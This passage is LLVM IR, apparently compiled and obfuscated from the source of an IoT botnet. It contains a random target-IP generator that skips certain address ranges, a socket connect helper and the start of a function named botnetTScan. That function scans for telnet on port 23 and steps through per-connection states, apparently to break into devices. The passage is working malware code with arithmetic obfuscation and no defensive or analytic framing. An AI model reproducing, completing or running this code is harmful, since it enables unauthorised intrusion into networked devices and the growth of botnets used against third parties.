  %2259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2260 = zext i8 %2259 to i32
  %2261 = icmp sge i32 %2260, 97
  br i1 %2261, label %2262, label %2266

; <label>:2262:                                   ; preds = %2258
  %2263 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2264 = zext i8 %2263 to i32
  %2265 = icmp slt i32 %2264, 99
  br i1 %2265, label %2322, label %2266

; <label>:2266:                                   ; preds = %2262, %2258, %2254
  %2267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2268 = zext i8 %2267 to i32
  %2269 = icmp eq i32 %2268, 86
  br i1 %2269, label %2270, label %2274

; <label>:2270:                                   ; preds = %2266
  %2271 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2272 = zext i8 %2271 to i32
  %2273 = icmp eq i32 %2272, 208
  br i1 %2273, label %2322, label %2274

; <label>:2274:                                   ; preds = %2270, %2266
  %2275 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2276 = zext i8 %2275 to i32
  %2277 = icmp eq i32 %2276, 86
  br i1 %2277, label %2278, label %2282

; <label>:2278:                                   ; preds = %2274
  %2279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2280 = zext i8 %2279 to i32
  %2281 = icmp eq i32 %2280, 209
  br i1 %2281, label %2322, label %2282

; <label>:2282:                                   ; preds = %2278, %2274
  %2283 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2284 = zext i8 %2283 to i32
  %2285 = icmp eq i32 %2284, 193
  br i1 %2285, label %2286, label %2290

; <label>:2286:                                   ; preds = %2282
  %2287 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2288 = zext i8 %2287 to i32
  %2289 = icmp eq i32 %2288, 164
  br i1 %2289, label %2322, label %2290

; <label>:2290:                                   ; preds = %2286, %2282
  %2291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2292 = zext i8 %2291 to i32
  %2293 = icmp eq i32 %2292, 120
  br i1 %2293, label %2294, label %2302

; <label>:2294:                                   ; preds = %2290
  %2295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2296 = zext i8 %2295 to i32
  %2297 = icmp sge i32 %2296, 103
  br i1 %2297, label %2298, label %2302

; <label>:2298:                                   ; preds = %2294
  %2299 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2300 = zext i8 %2299 to i32
  %2301 = icmp slt i32 %2300, 108
  br i1 %2301, label %2322, label %2302

; <label>:2302:                                   ; preds = %2298, %2294, %2290
  %2303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2304 = zext i8 %2303 to i32
  %2305 = icmp eq i32 %2304, 188
  br i1 %2305, label %2306, label %2310

; <label>:2306:                                   ; preds = %2302
  %2307 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2308 = zext i8 %2307 to i32
  %2309 = icmp eq i32 %2308, 68
  br i1 %2309, label %2322, label %2310

; <label>:2310:                                   ; preds = %2306, %2302
  %2311 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2312 = zext i8 %2311 to i32
  %2313 = icmp eq i32 %2312, 78
  br i1 %2313, label %2314, label %2318

; <label>:2314:                                   ; preds = %2310
  %2315 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2316 = zext i8 %2315 to i32
  %2317 = icmp eq i32 %2316, 46
  br i1 %2317, label %2322, label %2318

; <label>:2318:                                   ; preds = %2314, %2310
  %2319 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2320 = zext i8 %2319 to i32
  %2321 = icmp eq i32 %2320, 224
  br label %2322

; <label>:2322:                                   ; preds = %2318, %2314, %2306, %2298, %2286, %2278, %2270, %2262, %2250, %2238, %2230, %2222, %2210, %2198, %2186, %2174, %2158, %2142, %2126, %2114, %2106, %2094, %2082, %2070, %2058, %2046, %2034, %2022, %2010, %1994, %1978, %1962, %1946, %1930, %1914, %1898, %1882, %1866, %1850, %1834, %1818, %1802, %1786, %1770, %1754, %1738, %1722, %1714, %1706, %1698, %1690, %1682, %1674, %1666, %1658, %1650, %1642, %1634, %1626, %1618, %1610, %1602, %1594, %1586, %1570, %1554, %1538, %1522, %1506, %1490, %1474, %1458, %1442, %1426, %1410, %1394, %1386, %1378, %1362, %1346, %1330, %1314, %1298, %1282, %1266, %1250, %1234, %1218, %1202, %1186, %1170, %1154, %1138, %1122, %1106, %1090, %1074, %1058, %1042, %1034, %1026, %1018, %1010, %1002, %994, %986, %978, %970, %962, %954, %946, %934, %922, %910, %898, %886, %874, %862, %850, %838, %826, %814, %802, %790, %778, %766, %754, %742, %730, %718, %706, %694, %682, %670, %658, %646, %634, %622, %610, %598, %586, %574, %562, %550, %538, %526, %514, %502, %490, %478, %466, %454, %446, %434, %422, %414, %406, %398, %390, %382, %374, %366, %358, %350, %342, %334, %326, %318, %310, %302, %294, %286, %278, %270, %262, %254, %246, %238, %230, %222, %214, %206, %198, %190, %182, %174, %166, %158, %150, %142, %134, %126, %118, %110, %102, %98, %94, %90, %86, %82, %78, %74, %70, %66, %62, %58, %54, %50, %46, %42, %38, %34, %30, %26, %22, %18, %14
  %2323 = phi i1 [ true, %2314 ], [ true, %2306 ], [ true, %2298 ], [ true, %2286 ], [ true, %2278 ], [ true, %2270 ], [ true, %2262 ], [ true, %2250 ], [ true, %2238 ], [ true, %2230 ], [ true, %2222 ], [ true, %2210 ], [ true, %2198 ], [ true, %2186 ], [ true, %2174 ], [ true, %2158 ], [ true, %2142 ], [ true, %2126 ], [ true, %2114 ], [ true, %2106 ], [ true, %2094 ], [ true, %2082 ], [ true, %2070 ], [ true, %2058 ], [ true, %2046 ], [ true, %2034 ], [ true, %2022 ], [ true, %2010 ], [ true, %1994 ], [ true, %1978 ], [ true, %1962 ], [ true, %1946 ], [ true, %1930 ], [ true, %1914 ], [ true, %1898 ], [ true, %1882 ], [ true, %1866 ], [ true, %1850 ], [ true, %1834 ], [ true, %1818 ], [ true, %1802 ], [ true, %1786 ], [ true, %1770 ], [ true, %1754 ], [ true, %1738 ], [ true, %1722 ], [ true, %1714 ], [ true, %1706 ], [ true, %1698 ], [ true, %1690 ], [ true, %1682 ], [ true, %1674 ], [ true, %1666 ], [ true, %1658 ], [ true, %1650 ], [ true, %1642 ], [ true, %1634 ], [ true, %1626 ], [ true, %1618 ], [ true, %1610 ], [ true, %1602 ], [ true, %1594 ], [ true, %1586 ], [ true, %1570 ], [ true, %1554 ], [ true, %1538 ], [ true, %1522 ], [ true, %1506 ], [ true, %1490 ], [ true, %1474 ], [ true, %1458 ], [ true, %1442 ], [ true, %1426 ], [ true, %1410 ], [ true, %1394 ], [ true, %1386 ], [ true, %1378 ], [ true, %1362 ], [ true, %1346 ], [ true, %1330 ], [ true, %1314 ], [ true, %1298 ], [ true, %1282 ], [ true, %1266 ], [ true, %1250 ], [ true, %1234 ], [ true, %1218 ], [ true, %1202 ], [ true, %1186 ], [ true, %1170 ], [ true, %1154 ], [ true, %1138 ], [ true, %1122 ], [ true, %1106 ], [ true, %1090 ], [ true, %1074 ], [ true, %1058 ], [ true, %1042 ], [ true, %1034 ], [ true, %1026 ], [ true, %1018 ], [ true, %1010 ], [ true, %1002 ], [ true, %994 ], [ true, %986 ], [ true, %978 ], [ true, %970 ], [ true, %962 ], [ true, %954 ], [ true, %946 ], [ true, %934 ], [ true, %922 ], [ true, %910 ], [ true, %898 ], [ true, %886 ], [ true, %874 ], [ true, %862 ], [ true, %850 ], [ true, %838 ], [ true, %826 ], [ true, %814 ], [ true, %802 ], [ true, %790 ], [ true, %778 ], [ true, %766 ], [ true, %754 ], [ true, %742 ], [ true, %730 ], [ true, %718 ], [ true, %706 ], [ true, %694 ], [ true, %682 ], [ true, %670 ], [ true, %658 ], [ true, %646 ], [ true, %634 ], [ true, %622 ], [ true, %610 ], [ true, %598 ], [ true, %586 ], [ true, %574 ], [ true, %562 ], [ true, %550 ], [ true, %538 ], [ true, %526 ], [ true, %514 ], [ true, %502 ], [ true, %490 ], [ true, %478 ], [ true, %466 ], [ true, %454 ], [ true, %446 ], [ true, %434 ], [ true, %422 ], [ true, %414 ], [ true, %406 ], [ true, %398 ], [ true, %390 ], [ true, %382 ], [ true, %374 ], [ true, %366 ], [ true, %358 ], [ true, %350 ], [ true, %342 ], [ true, %334 ], [ true, %326 ], [ true, %318 ], [ true, %310 ], [ true, %302 ], [ true, %294 ], [ true, %286 ], [ true, %278 ], [ true, %270 ], [ true, %262 ], [ true, %254 ], [ true, %246 ], [ true, %238 ], [ true, %230 ], [ true, %222 ], [ true, %214 ], [ true, %206 ], [ true, %198 ], [ true, %190 ], [ true, %182 ], [ true, %174 ], [ true, %166 ], [ true, %158 ], [ true, %150 ], [ true, %142 ], [ true, %134 ], [ true, %126 ], [ true, %118 ], [ true, %110 ], [ true, %102 ], [ true, %98 ], [ true, %94 ], [ true, %90 ], [ true, %86 ], [ true, %82 ], [ true, %78 ], [ true, %74 ], [ true, %70 ], [ true, %66 ], [ true, %62 ], [ true, %58 ], [ true, %54 ], [ true, %50 ], [ true, %46 ], [ true, %42 ], [ true, %38 ], [ true, %34 ], [ true, %30 ], [ true, %26 ], [ true, %22 ], [ true, %18 ], [ true, %14 ], [ %2321, %2318 ]
  br i1 %2323, label %2324, label %2337

; <label>:2324:                                   ; preds = %2322
  %2325 = call i32 @rand() #3
  %2326 = srem i32 %2325, 223
  %2327 = trunc i32 %2326 to i8
  store i8 %2327, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2328 = call i32 @rand() #3
  %2329 = srem i32 %2328, 255
  %2330 = trunc i32 %2329 to i8
  store i8 %2330, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2331 = call i32 @rand() #3
  %2332 = srem i32 %2331, 255
  %2333 = trunc i32 %2332 to i8
  store i8 %2333, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2334 = call i32 @rand() #3
  %2335 = srem i32 %2334, 255
  %2336 = trunc i32 %2335 to i8
  store i8 %2336, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:2337:                                   ; preds = %2322
  %2338 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %2338, i8 0, i64 16, i32 16, i1 false)
  %2339 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %2340 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2341 = zext i8 %2340 to i32
  %2342 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2343 = zext i8 %2342 to i32
  %2344 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2345 = zext i8 %2344 to i32
  %2346 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  %2347 = zext i8 %2346 to i32
  %2348 = call i32 (i8*, i8*, ...) @szprintf(i8* %2339, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.95, i32 0, i32 0), i32 %2341, i32 %2343, i32 %2345, i32 %2347)
  %2349 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %2350 = call i32 @inet_addr(i8* %2349) #3
  ret i32 %2350
}

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define i32 @GRIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %5, -1
  %8 = xor i32 %6, -1
  %9 = xor i32 -1786363541, -1
  %10 = or i32 %7, %8
  %11 = or i32 -1786363541, %9
  %12 = xor i32 %10, -1
  %13 = and i32 %12, %11
  %14 = and i32 %5, %6
  store i32 %13, i32* %3, align 4
  %15 = load i32, i32* %3, align 4
  %16 = call i32 @rand_cmwc()
  %17 = load i32, i32* %2, align 4
  %18 = xor i32 %17, -1
  %19 = and i32 1349812850, %18
  %20 = xor i32 1349812850, -1
  %21 = and i32 %17, %20
  %22 = xor i32 -1, -1
  %23 = and i32 %22, 1349812850
  %24 = and i32 -1, %20
  %25 = or i32 %19, %21
  %26 = or i32 %23, %24
  %27 = xor i32 %25, %26
  %28 = xor i32 %17, -1
  %29 = xor i32 %27, -1
  %30 = xor i32 %16, %29
  %31 = and i32 %30, %16
  %32 = and i32 %16, %27
  %33 = xor i32 %15, -1
  %34 = and i32 %31, %33
  %35 = xor i32 %31, -1
  %36 = and i32 %15, %35
  %37 = or i32 %34, %36
  %38 = xor i32 %15, %31
  ret i32 %37
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #3
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #10
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #3
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #3
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @botnetTScan(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %23 = load i32, i32* %4, align 4
  store i32 %23, i32* %11, align 4
  %24 = call i64 @time(i64* null) #3
  %25 = call i32 @rand_cmwc()
  %26 = zext i32 %25 to i64
  %27 = xor i64 %24, -1
  %28 = and i64 %26, %27
  %29 = xor i64 %26, -1
  %30 = and i64 %24, %29
  %31 = or i64 %28, %30
  %32 = xor i64 %24, %26
  %33 = trunc i64 %31 to i32
  call void @srand(i32 %33) #3
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = call zeroext i16 @htons(i16 zeroext 23) #10
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %38 = getelementptr inbounds [8 x i8], [8 x i8]* %37, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 8, i32 4, i1 false)
  %39 = call noalias i8* @malloc(i64 1025) #3
  store i8* %39, i8** %17, align 8
  %40 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 1025, i32 1, i1 false)
  %41 = load i32, i32* %11, align 4
  %42 = zext i32 %41 to i64
  %43 = call i8* @llvm.stacksave()
  store i8* %43, i8** %19, align 8
  %44 = alloca %struct.telstate_t, i64 %42, align 16
  %45 = bitcast %struct.telstate_t* %44 to i8*
  %46 = load i32, i32* %11, align 4
  %47 = sext i32 %46 to i64
  %48 = mul i64 %47, 5
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 %48, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  br label %49

; <label>:49:                                     ; preds = %67, %2
  %50 = load i32, i32* %5, align 4
  %51 = load i32, i32* %11, align 4
  %52 = icmp slt i32 %50, %51
  br i1 %52, label %53, label %74

; <label>:53:                                     ; preds = %49
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %55
  %57 = bitcast %struct.telstate_t* %56 to i8*
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 32, i32 16, i1 false)
  %58 = load i32, i32* %5, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %59
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i32 0, i32 3
  store i8 1, i8* %61, align 1
  %62 = load i8*, i8** %17, align 8
  %63 = load i32, i32* %5, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %65, i32 0, i32 9
  store i8* %62, i8** %66, align 8
  br label %67

; <label>:67:                                     ; preds = %53
  %68 = load i32, i32* %5, align 4
  %69 = sub i32 0, %68
  %70 = sub i32 0, 1
  %71 = add i32 %69, %70
  %72 = sub i32 0, %71
  %73 = add nsw i32 %68, 1
  store i32 %72, i32* %5, align 4
  br label %49

; <label>:74:                                     ; preds = %49
  store i32 0, i32* %7, align 4
  br label %75

; <label>:75:                                     ; preds = %85, %74
  %76 = load i32, i32* %7, align 4
  %77 = sub i32 %76, 938031307
  %78 = add i32 %77, 1
  %79 = add i32 %78, 938031307
  %80 = add nsw i32 %76, 1
  store i32 %79, i32* %7, align 4
  %81 = sext i32 %79 to i64
  %82 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = icmp ne i8* %83, null
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %75
  br label %75

; <label>:86:                                     ; preds = %75
  br label %87

; <label>:87:                                     ; preds = %744, %86
  br label %88

; <label>:88:                                     ; preds = %87
  store i32 0, i32* %5, align 4
  br label %89

; <label>:89:                                     ; preds = %738, %88
  %90 = load i32, i32* %5, align 4
  %91 = load i32, i32* %11, align 4
  %92 = icmp slt i32 %90, %91
  br i1 %92, label %93, label %744

; <label>:93:                                     ; preds = %89
  %94 = load i32, i32* %5, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %95
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %96, i32 0, i32 7
  %98 = load i32, i32* %97, align 16
  %99 = icmp eq i32 %98, 0
  br i1 %99, label %100, label %107

; <label>:100:                                    ; preds = %93
  %101 = call i64 @time(i64* null) #3
  %102 = trunc i64 %101 to i32
  %103 = load i32, i32* %5, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %104
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %105, i32 0, i32 7
  store i32 %102, i32* %106, align 16
  br label %107

; <label>:107:                                    ; preds = %100, %93
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %109
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %110, i32 0, i32 2
  %112 = load i8, i8* %111, align 8
  %113 = zext i8 %112 to i32
  switch i32 %113, label %737 [
    i32 0, label %114
    i32 1, label %258
    i32 2, label %379
    i32 3, label %428
    i32 4, label %473
    i32 5, label %522
    i32 6, label %567
    i32 7, label %670
  ]

; <label>:114:                                    ; preds = %107
  %115 = load i32, i32* %5, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %116
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %117, i32 0, i32 3
  %119 = load i8, i8* %118, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 1
  br i1 %121, label %122, label %142

; <label>:122:                                    ; preds = %114
  %123 = load i32, i32* %5, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %124
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %125, i32 0, i32 9
  %127 = load i8*, i8** %126, align 8
  store i8* %127, i8** %20, align 8
  %128 = load i32, i32* %5, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %129
  %131 = bitcast %struct.telstate_t* %130 to i8*
  call void @llvm.memset.p0i8.i64(i8* %131, i8 0, i64 32, i32 16, i1 false)
  %132 = load i8*, i8** %20, align 8
  %133 = load i32, i32* %5, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %134
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %135, i32 0, i32 9
  store i8* %132, i8** %136, align 8
  %137 = call i32 @GIP()
  %138 = load i32, i32* %5, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %139
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %140, i32 0, i32 1
  store i32 %137, i32* %141, align 4
  br label %195

; <label>:142:                                    ; preds = %114
  %143 = load i32, i32* %5, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %144
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %145, i32 0, i32 3
  %147 = load i8, i8* %146, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 0
  br i1 %149, label %150, label %194

; <label>:150:                                    ; preds = %142
  %151 = load i32, i32* %5, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %152
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %153, i32 0, i32 5
  %155 = load i8, i8* %154, align 1
  %156 = add i8 %155, -111
  %157 = add i8 %156, 1
  %158 = sub i8 %157, -111
  %159 = add i8 %155, 1
  store i8 %158, i8* %154, align 1
  %160 = load i32, i32* %5, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %161
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %162, i32 0, i32 4
  %164 = load i8, i8* %163, align 2
  %165 = sub i8 0, 1
  %166 = sub i8 %164, %165
  %167 = add i8 %164, 1
  store i8 %166, i8* %163, align 2
  %168 = load i32, i32* %5, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %169
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %170, i32 0, i32 5
  %172 = load i8, i8* %171, align 1
  %173 = zext i8 %172 to i64
  %174 = icmp eq i64 %173, 1
  br i1 %174, label %175, label %180

; <label>:175:                                    ; preds = %150
  %176 = load i32, i32* %5, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %177
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %178, i32 0, i32 3
  store i8 1, i8* %179, align 1
  br label %738

; <label>:180:                                    ; preds = %150
  %181 = load i32, i32* %5, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %182
  %184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %183, i32 0, i32 4
  %185 = load i8, i8* %184, align 2
  %186 = zext i8 %185 to i64
  %187 = icmp eq i64 %186, 1
  br i1 %187, label %188, label %193

; <label>:188:                                    ; preds = %180
  %189 = load i32, i32* %5, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %190
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %191, i32 0, i32 3
  store i8 1, i8* %192, align 1
  br label %738

; <label>:193:                                    ; preds = %180
  br label %194

; <label>:194:                                    ; preds = %193, %142
  br label %195

; <label>:195:                                    ; preds = %194, %122
  %196 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %196, align 4
  %197 = call zeroext i16 @htons(i16 zeroext 23) #10
  %198 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %197, i16* %198, align 2
  %199 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %200 = getelementptr inbounds [8 x i8], [8 x i8]* %199, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %200, i8 0, i64 8, i32 4, i1 false)
  %201 = load i32, i32* %5, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %202
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %203, i32 0, i32 1
  %205 = load i32, i32* %204, align 4
  %206 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %207 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %206, i32 0, i32 0
  store i32 %205, i32* %207, align 4
  %208 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %209 = load i32, i32* %5, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %210
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %211, i32 0, i32 0
  store i32 %208, i32* %212, align 16
  %213 = load i32, i32* %5, align 4
  %214 = sext i32 %213 to i64
